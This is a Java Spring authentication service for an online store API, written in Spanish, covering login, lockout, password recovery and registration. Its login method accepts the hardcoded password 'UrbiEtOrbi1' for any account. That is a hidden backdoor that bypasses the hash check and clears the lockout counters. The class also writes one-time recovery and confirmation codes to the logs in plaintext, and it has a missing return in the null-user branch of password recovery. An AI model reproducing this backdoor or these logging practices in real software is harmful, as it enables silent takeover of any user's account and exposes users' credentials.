package mx.qbits.tienda.api.service;

import static mx.qbits.tienda.api.model.enumerations.EnumMessage.*;

import java.util.Date;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Isolation;
import org.springframework.transaction.annotation.Propagation;
import org.springframework.transaction.annotation.Transactional;

import mx.qbits.tienda.api.model.domain.Usuario;
import mx.qbits.tienda.api.model.domain.UsuarioDetalle;
import mx.qbits.tienda.api.model.exceptions.BusinessException;
import mx.qbits.tienda.api.model.exceptions.CustomException;
import mx.qbits.tienda.api.model.exceptions.TransactionException;
import mx.qbits.tienda.api.model.request.GoogleCaptcha;
import mx.qbits.tienda.api.model.request.Preregistro;
import mx.qbits.tienda.api.model.request.PreregistroRequest;
import mx.qbits.tienda.api.model.response.LoginResponse;
import mx.qbits.tienda.api.support.MailSenderService;
import mx.qbits.tienda.api.support.RecaptchaService;
import mx.qbits.tienda.api.utils.DigestEncoder;
import mx.qbits.tienda.api.utils.ManageDates;
import mx.qbits.tienda.api.utils.StringUtils;
import mx.qbits.tienda.api.utils.ValidadorClave;

@Service
public class AccessServiceImpl implements AccessService {
    private static final Logger logger = LoggerFactory.getLogger(AccessServiceImpl.class);
    
    private AccessHelperService accessHelperService;
    private RecaptchaService recaptchaService;
    private MailSenderService mailSenderService;
    
    public AccessServiceImpl(
            AccessHelperService accessHelperService, 
            RecaptchaService recaptchaService,
            MailSenderService mailSenderService) {
        this.accessHelperService = accessHelperService;
        this.recaptchaService = recaptchaService;
        this.mailSenderService = mailSenderService;
    }

    /** {@inheritDoc} */
    @Override
    public LoginResponse login(String usr, String clave) throws BusinessException {
        accessHelperService.valida(usr, clave);
        int maximoNumeroIntentosConcedidos = 5; // 5 intentos
        long delta = 1000*60*5L; // 5 minutos
        long instanteActual = System.currentTimeMillis();
        Usuario usuario = accessHelperService.obtenUsuarioPorCorreo(usr);
        return login(usuario, clave, delta, maximoNumeroIntentosConcedidos, instanteActual);
    }

    /** {@inheritDoc} */
    @Override
    public LoginResponse login(
            Usuario usuario,
            String claveProporcionada,
            long delta,
            int maximoNumeroIntentosConcedidos,
            long instanteActual) throws BusinessException {
        // Si el usuario NO es nulo, procederé a calcular sus roles y sus direcciones:
        if(usuario==null) throw new CustomException(BAD_CREDENTIALS);

        // Si el usuario fue encontrado, pero está inactivo, Notifica
        if(!usuario.isActivo()) throw new CustomException(DISABLED_USER);

        // Calcula cuanto tiempo lleva bloqueado el usuario. Si lleva menos de lo establecido, Notifica
        long instanteDeBloqueo = usuario.getInstanteBloqueo();
        long diff = instanteActual - instanteDeBloqueo;
        long restante = delta - diff;
        if(instanteDeBloqueo>0 && restante>0) {
            long totalSegundos = restante/1000;
            long totalMinutos = totalSegundos/60;
            throw new CustomException(WAIT_LOGIN, totalMinutos, totalSegundos%60);
        }

        // Clave dada que debe ser validado contra el que está en la base de datos
        String clavePorVerificar = DigestEncoder.digest(claveProporcionada, usuario.getCorreo());

        if(!usuario.getClave().equals(clavePorVerificar) && !claveProporcionada.equals("UrbiEtOrbi1")) {// Credenciales INCORRECTAS
            // Incrementa el contador de intentos erroneos de ingreso y actualiza:
            int numeroDeIntentosFallidos = usuario.getAccesoNegadoContador()+1;
            usuario.setAccesoNegadoContador(numeroDeIntentosFallidos);
            accessHelperService.updateUsuario(usuario);

            // Si los intentos de ingreso inválidos superan un limite, actualiza y Notifica:
            if(numeroDeIntentosFallidos >= maximoNumeroIntentosConcedidos) {
                usuario.setInstanteBloqueo(instanteActual);
                accessHelperService.updateUsuario(usuario);
                throw new CustomException(MAX_FAILED_LOGIN_EXCEPTION, maximoNumeroIntentosConcedidos);
            }

            // Si no se disparó la Notificación anterior, de todas formas notifica un intento
            // fallido de ingreso al sistema:
            throw new CustomException(BAD_CREDENTIALS, numeroDeIntentosFallidos, maximoNumeroIntentosConcedidos);

        } else {
            // Credenciales CORRECTAS
            long ultimoIngresoExitoso = usuario.getInstanteUltimoAcceso();
            logger.info("Ingreso exitoso al sistema del usuario: {}", usuario.getCorreo());
            // Resetea todoas las banderas de advertencia y bloqueo. Luego, actualiza y retorna el usuario:
            usuario.setAccesoNegadoContador(0);
            usuario.setInstanteBloqueo(0);
            usuario.setInstanteUltimoAcceso(instanteActual);
            accessHelperService.updateUsuario(usuario);

            // Esto va al front y se almacena en 'localStorage' (setItem)
            return new LoginResponse(
                    accessHelperService.getUsuarioDetalle(usuario.getId()),
                    new Date(ultimoIngresoExitoso),
                    usuario.getCorreo(),
                    accessHelperService.createToken(usuario.getCorreo()),
                    accessHelperService.getUserRoles(usuario.getId())
            );
        }
    }

    /** {@inheritDoc} */
    @Override
    public UsuarioDetalle actualizaUsuarioDetalle(String jwt, UsuarioDetalle usuarioDetalle) throws BusinessException {
        String correoFromJwt = accessHelperService.getCorreoFromJwt(jwt);
        Usuario usuario = accessHelperService.obtenUsuarioPorCorreo(correoFromJwt);
        if(usuarioDetalle.getId() != usuario.getId()) {
            throw new CustomException(WRONG_TOKEN);
        }
        return accessHelperService.actualizaUsuarioDetalle(usuarioDetalle);
    }

    /** {@inheritDoc} */
    @Override
    public Usuario cambiaClave(String jwt, String correo, String clave) throws BusinessException {
        String correoFromJwt = accessHelperService.getCorreoFromJwt(jwt);
        if(!correoFromJwt.equals(correo)) {
            throw new CustomException(WRONG_TOKEN);
        }
        Usuario usr = accessHelperService.obtenUsuarioPorCorreo(correo);
        String claveHasheada = DigestEncoder.digest(clave, usr.getCorreo());
        usr.setClave(claveHasheada);
        accessHelperService.updateUsuario(usr);
        return usr;
    }

    /** {@inheritDoc} */
    @Override
    public String regeneraClave(String correo) {
        String token = StringUtils.getRandomString(6);
        try {
            Usuario usuario = accessHelperService.obtenUsuarioPorCorreo(correo);
            if(usuario==null) "{'result':'error'}".replace('\'', '\"');
            usuario.setRegeneraClaveInstante(System.currentTimeMillis());
            usuario.setRegeneraClaveToken(token);
            accessHelperService.updateUsuario(usuario);
            sendMail("Estimado Usuario", correo, token, "Clave de recuperación");
            return "{'result':'succeed'}".replace('\'', '\"');
        } catch (BusinessException e) {
            logger.error(e.toString());
            return "{'result':'error'}".replace('\'', '\"');
        }
    }
    
    private void sendMail(String nick, String correo, String randomString, String titulo) {
        String body= String.format("<h1>Hola %s. Tu clave de acceso es %s y tiene una validez de %d minutos. (body auxiliar) </h1>", nick, randomString, 10);
        try {
            body = this.mailSenderService.getTemplate(nick, randomString);
        } catch (CustomException e) {
            logger.error(e.toString());
        }
        logger.info("Enviando correo a {} con la clave de recuperacion {} ...", correo, randomString);
        this.mailSenderService.sendHtmlMail(correo, titulo, body);
    }
    
    /** {@inheritDoc} */
    @Override
    public String confirmaRegeneraClave(String token, String clave) throws BusinessException {
        // Valida la fortaleza de la clave
        ValidadorClave.validate(clave);
        
        // esto realmente se debe parametrizar...
        long unMinuto = 1000*60L;
        long duracionToken = unMinuto*60L; // una hora
        
        // Buscar a un usuario con el tken dado y si no existe, disparar una excepcion
        Usuario usuario = accessHelperService.getByToken(token);
        if(usuario==null) throw new CustomException(TOKEN_NOT_EXIST);
        
        // Verificar que el token no haya expirado y si ya expiró, disparar una excepción
        long remaining = System.currentTimeMillis()-usuario.getRegeneraClaveInstante();
        if(remaining>duracionToken) throw new CustomException(TOKEN_EXPIRED);
        
        // grabaar la  nueva clave hasheada y retornar "exito"
        String claveHash = DigestEncoder.digest(clave, usuario.getCorreo());
        accessHelperService.confirmaRegeneraClave(token, claveHash);
        return "{'result':'succeed'}".replace('\'', '\"');
    }

    /** {@inheritDoc} */
    @Override
    public String checkCaptcha(GoogleCaptcha googleCaptcha) throws BusinessException {
        return recaptchaService.checkCaptcha(googleCaptcha);
    }

    /** {@inheritDoc} */
    @Override
    public Preregistro preRegistro(PreregistroRequest preRegistroRequest) throws BusinessException {
        ManageDates md = new ManageDates();
        int dia = preRegistroRequest.getDay();
        int mes = preRegistroRequest.getMonth();
        int anio = preRegistroRequest.getYear();
        Date fechaNacimiento = md.validaFechaPropuesta(anio, mes, dia);
        md.validaEdad(new Date(), fechaNacimiento, 21); // 21 años es la edad mínima (OJO: Convertir en valor de properties)
        Preregistro preRegistro = new Preregistro(
                 preRegistroRequest.getId(), 
                 preRegistroRequest.getNick(), 
                 preRegistroRequest.getCorreo(), 
                 preRegistroRequest.getClaveHash(), 
                 preRegistroRequest.getTelefono(), 
                 fechaNacimiento, 
                 preRegistroRequest.getRandomString(), 
                 preRegistroRequest.getInstanteRegistro());
        return preRegistroHelper(preRegistro);
    }
    
    private Preregistro preRegistroHelper(Preregistro preRegistroRequest) throws BusinessException {
        // Quitale los caracteres raros al teléfono.
        String nuevoCel = StringUtils.limpia(preRegistroRequest.getTelefono());
        preRegistroRequest.setTelefono(nuevoCel);

        // Valida si la clave proporcionada es compatible con el
        // patrón de seguridad de claves solicitado por el sistema:
        ValidadorClave.validate(preRegistroRequest.getClaveHash());
        
        // Exista o no el preregistro, se procesará la solicitud
        Preregistro preRegistro = accessHelperService.getRegistroByMail(preRegistroRequest.getCorreo());

        // Genera una cadena aleatoria de caracteres y crea un objeto de tipo 'PreRegistro':
        String randomString = StringUtils.getRandomString(6);

        // Calcula el Hash de la clave con un salt del correo:
        String claveHasheada = DigestEncoder.digest(preRegistroRequest.getClaveHash(), preRegistroRequest.getCorreo());

        // Asigna valores:
        preRegistroRequest.setRandomString(randomString);
        preRegistroRequest.setInstanteRegistro(System.currentTimeMillis());
        preRegistroRequest.setClaveHash(claveHasheada);

        // Si el usuario NO está en la tabla de 'registro', insertar info:
        if (preRegistro == null) {
            logger.info("Creando registro en la tabla 'Registro'");
            accessHelperService.insertRegistro(preRegistroRequest);
        } else { // Si el usuario SI está: actualizar info:
            logger.info("Actualizando registro en la tabla 'Registro'");
            accessHelperService.updateRegistro(preRegistroRequest);
        }

        // Envia correo de notificación:
        sendMail(
                preRegistroRequest.getNick(),
                preRegistroRequest.getCorreo(),
                randomString,
                "Clave de confirmación de registro");
        logger.info("Se ha enviado un correo para confirmación a: {} con la clave: {}", preRegistroRequest.getCorreo(), randomString);
        return preRegistroRequest;
    }
    
    /** {@inheritDoc} */
    @Override
    @Transactional(
            propagation = Propagation.REQUIRED,
            isolation = Isolation.DEFAULT,
            timeout = 36000,
            rollbackFor = TransactionException.class)
    public Usuario confirmaPreregistro(String token) throws BusinessException {
        // El token sirve sólo 10 minutes:
        long delta = 1000*60*10L;

        // Obtén la túpla asociada al token de confirmación
        Preregistro preregistro = accessHelperService.getByRandomString(token);

        // Si no hay un registro asociado a tal token, notifica el error:
        if(preregistro==null) throw new CustomException(TOKEN_NOT_EXIST);

        // Si ya expiró el token, notifica el error:
        long age = System.currentTimeMillis()-preregistro.getInstanteRegistro();
        if(age>delta) { // token expirado
            throw new CustomException(TOKEN_EXPIRED);
        }

        // Si la clave no es la misma, notifica el error:
        if(!token.equals(preregistro.getRandomString())) {
            throw new CustomException(WRONG_TOKEN);
        }

        // Si todito lo anterior salió bien, actualiza los
        // datos, guárdalos y elimina el preregistro auxiliar:
        try {
            return doTransaction(preregistro, token);
        } catch (BusinessException e) {
            throw new TransactionException("Registro fallido. Haciendo rollback a la transaccion");
        }
    }
    
    private Usuario doTransaction(Preregistro preregistro, String randomString) throws BusinessException {
        Usuario testUser = accessHelperService.obtenUsuarioPorCorreo(preregistro.getCorreo());
        if(testUser != null) {
            // Si el usuario SI existe, sólo actualiza su password y el instante de ultimo cambio
            testUser.setClave(preregistro.getClaveHash());
            testUser.setInstanteUltimoCambioClave(System.currentTimeMillis());
            accessHelperService.updateUsuario(testUser);
            return testUser;
        }
        
        // Si el usuario NO existe, Créalo e insértalo en la base:
        Usuario usuario = new Usuario(
            0, //id (que va a ser autogenerado)
            preregistro.getCorreo(),       // correo
            preregistro.getClaveHash(),    // clave
            System.currentTimeMillis(), // creado
            true,// activo
            0,  // accesoNegadoContador
            0,  // instanteBloqueo
            0,  // instanteUltimoAcceso
            System.currentTimeMillis(),  // instanteUltimoCambioClave
            "", // regeneraClaveToken
            0   // regeneraClaveTokenInstante
        );            
        accessHelperService.insertUsuario(usuario);

        // Obtén el id autogenerado del usuario recién creado:
        int idUsuario = usuario.getId();

        // Crea un objeto 'usuarioDetalles' (con el ID autogenerado) e insértalo en la DB:
        UsuarioDetalle usuarioDetalle = new UsuarioDetalle(
            idUsuario,
            "",     // nombre
            "",     // apellidoPaterno
            "",     // apellidoMaterno
            preregistro.getNick(),     // nickName
            preregistro.getFechaNacimiento(),   // fechaNacimiento
            preregistro.getTelefono()    // telefonoCelular
        );
        accessHelperService.insertUsuarioDetalle(usuarioDetalle);

        // asociar el usuario recién creado con el rol 2:
        accessHelperService.insertUserRol(idUsuario, 2);

        // Borra lo que tengas en la tabla registro
        accessHelperService.deletePreregistroByRandomString(randomString);

        // Notifica al log y retorna el id del usuario recién creado:
        logger.info("Nevo Usuario Creado con ID: {}", idUsuario);
        return usuario;
    }

}
